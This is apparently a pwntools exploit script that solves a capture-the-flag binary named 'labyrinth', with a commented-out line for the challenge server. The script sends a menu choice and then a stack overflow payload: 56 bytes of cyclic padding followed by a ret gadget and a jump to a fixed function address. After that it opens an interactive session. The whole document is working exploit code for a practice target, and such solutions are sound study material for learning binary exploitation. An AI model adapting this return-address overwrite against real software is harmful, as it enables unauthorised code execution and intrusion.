from pwn import *

elf = context.binary = ELF('./labyrinth', checksec=False)
context.log_level = 'debug'

io = process() 
#io = remote('46.101.73.33',30473)

payload = cyclic(56) + pack(0x0000000000401016) + pack(0x0000000000401255)

io.sendline('69')
io.sendline(payload)
#flag = io.recv(...)
# log.success(flag)

io.interactive()


